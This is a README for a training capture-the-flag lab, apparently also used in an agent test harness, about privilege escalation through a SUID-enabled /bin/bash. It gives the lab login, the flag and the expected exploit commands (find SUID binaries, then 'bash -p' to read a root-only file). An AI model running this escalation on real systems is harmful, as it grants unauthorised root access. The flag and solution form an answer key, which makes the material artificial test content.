# suid-privesc — SUID Binary Privilege Escalation

**Vulnerability:** `/bin/bash` has the SUID bit set, allowing any user to spawn a root shell  
**Tools:** `ssh`, `find`, `bash -p`  
**Flag:** `WMG{su1d_b4sh_pr1v3sc_1s_trivial}`

## Scenario

NovaTech Solutions provisioned a server with a misconfiguration: `/bin/bash`
has the SUID bit set. A low-privilege account (`student`/`letmein123`) is
reachable via SSH. Students enumerate SUID binaries with `find`, then use
`bash -p` to elevate to root and read `/root/flag.txt`.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/suid-privesc/setup.yml
```

First run: `ok=8 changed=4`  
Second run: `ok=8 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh suid-privesc
```

## Expected exploit

```bash
sshpass -p letmein123 ssh -p 2222 student@127.0.0.1 \
  'find / -perm -4000 -name bash 2>/dev/null'
# → /bin/bash

sshpass -p letmein123 ssh -p 2222 student@127.0.0.1 \
  '/bin/bash -p -c "cat /root/flag.txt"'
# → WMG{su1d_b4sh_pr1v3sc_1s_trivial}
```

## Training

`training.json` — 9 levels: SSH access → local enumeration → SUID discovery → privilege escalation → flag retrieval → ASSESSMENT.  
MITRE ATT&CK: T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid).  
CyberRangeCZ subnet: 10.1.28.0/24
